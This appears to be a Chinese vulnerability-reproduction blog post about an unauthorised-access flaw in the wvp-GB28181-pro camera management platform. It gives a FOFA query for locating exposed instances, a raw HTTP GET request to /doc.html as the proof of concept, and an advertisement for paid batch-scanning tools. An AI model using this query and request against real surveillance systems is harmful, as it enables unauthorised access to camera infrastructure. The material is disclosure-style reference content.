#  wvp-GB28181pro摄像头管理平台存在未授权访问漏洞  附POC  
2026-9-28更新
                    2026-9-28更新  南风漏洞复现文库   2026-09-28 01:07  
  
   
  
#   
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. wvp-GB28181pro摄像头管理平台简介  
  
微信公众号搜索：南风漏洞复现文库  
该文章 南风漏洞复现文库 公众号首发  
  
wvp-GB28181pro摄像头管理平台  
## 2.漏洞描述  
  
wvp-GB28181-pro 是一个开箱即用的开源网络视频管理平台，它作为整个监控系统的“中枢大脑”，负责处理信令和设备管理，wvp-GB28181pro摄像头管理平台存在未授权访问漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
wvp-GB28181pro摄像头管理平台  
![wvp-GB28181pro摄像头管理平台存在未授权访问漏洞](https://mmbiz.qpic.cn/mmbiz_png/b9KQYsB8q6zclQ6rJene2uDj3NfueWF9SuGv6u6n6m2Se3hM9TJbdoibRawhmIJtLibzFcyXgnW8LnkQ2kwibiaCSC3rm6KTA6v7K9yL0ExZfZE/640?wx_fmt=png&from=appmsg "")  
  
wvp-GB28181pro摄像头管理平台存在未授权访问漏洞  
## 4.fofa查询语句  
  
body="国标28181"  
## 5.漏洞复现  
  
漏洞链接：http://xxx.xx.xx.xx/doc.html  
  
漏洞数据包：  
```
GET /doc.html HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9KQYsB8q6w4RAuN7nHBLmK8YxnrzhNz76vuvGI66HoA6hMT8WNBDZ1RlBjTEp0YicQtSkKRWVUVxfXeOyvNJpMxnVq0SojcZsylSYEqicpp8/640?wx_fmt=png&from=appmsg "")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。   
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
5: Nuclei脚本。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6x2OqEFYOPVF6c08ypiac5vQAKxrRYYCYpZIq8gibXrjyPr7BYqRqicPBNDTFyLlC9cfZdKYH30ibsApHhFrylnHCFFTlGmxibmkkDY/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6wLO1lZ9Oa9ZykVVr3cocW9kDokl4EiaY9MgtcLicJ5mVwZib1NEM0UEJsxo1wVw5icnbgEI4P51g5OkNFNGaZer2wTLao6BqibJRIU/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6x3snNHvyPicUjRky4ILEL6iaGiakRC60EuJ53J0o73p8uOyKwzTIO3ib6lTaQZiaR9HBX4tsLWicZOXNZiaPKR3O7sWIVGSPyZj0wRU4/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6yDAfjia978ycbGiaUibGZfEmIEZBibz2qoTJsCWcxEUm8icIVd6MW4b3P5YSJDu3mc6gU1osdXamsiaX9WpGUFAsdmIsGIHbu6NCBA4/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6xCozaaiamarg40YPNgGv6nntnblOGl1Qbses5I8AE1Vgryiaz5wVfcYlUpFjJ77pbkg1yJXQYtF2C7ibU3N0HZmCr6JVepaBSqPc/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6w3rgAxmAoIRYUbfZvnOd4sEUvdRlmqzXPdNYib528wZcV9FiaPZxefl0ttibjKBsjiaIiayMZg7vFWQg6wyl0sNNnNPX1HF8AdIdiaE/640?wx_fmt=jpeg&from=appmsg "")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
   
  
  
  
